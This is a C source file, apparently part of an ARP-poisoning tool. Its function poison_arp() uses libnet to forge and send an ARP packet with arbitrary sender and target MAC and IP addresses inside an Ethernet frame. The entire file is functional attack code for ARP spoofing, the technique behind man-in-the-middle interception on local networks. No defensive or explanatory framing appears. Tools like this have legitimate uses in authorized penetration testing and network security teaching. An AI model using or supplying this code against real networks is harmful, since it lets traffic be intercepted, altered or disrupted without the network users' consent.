#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <libnet.h>


#include "poison_arp.h"

/*
	default arp function: more advanced requirements can call
	poison_arp_adv() 
*/

int poison_arp(poison_session_t *session, unsigned short op, unsigned char *destMAC, ip_addr_t destIP, unsigned char *srcMAC, ip_addr_t srcIP) 
{
	libnet_ptag_t arptag;
	libnet_ptag_t ethertag;
	
	/* build basic ARP packet */
	arptag = libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, 6, 4, op, srcMAC, 
				(u_int8_t *)&srcIP, destMAC, (u_int8_t *)&destIP, 
				NULL, 0, session->arp_packet, 0);

	if (arptag == -1)
	{
		strcpy(session->errbuf, "libnet_build_arp() failed!\n");
		return POISON_LIBNET_ERR;
	}

	/* build ethernet underneath */
	ethertag = libnet_build_ethernet(destMAC, srcMAC, ETHERTYPE_ARP, NULL,
				0, session->arp_packet, 0);		
	
	if (ethertag == -1)
	{
		strcpy(session->errbuf, "libnet_build_ethernet() failed!\n");
		return POISON_LIBNET_ERR;
	}

	
	/* write to wire */
	if (libnet_write(session->arp_packet) == -1)
	{
		strcpy(session->errbuf, "libnet_write() failed!\n");
		return POISON_LIBNET_ERR;
	}

	/* clean up packet for reuse */
	libnet_clear_packet(session->arp_packet);
		
	return POISON_OK;
}
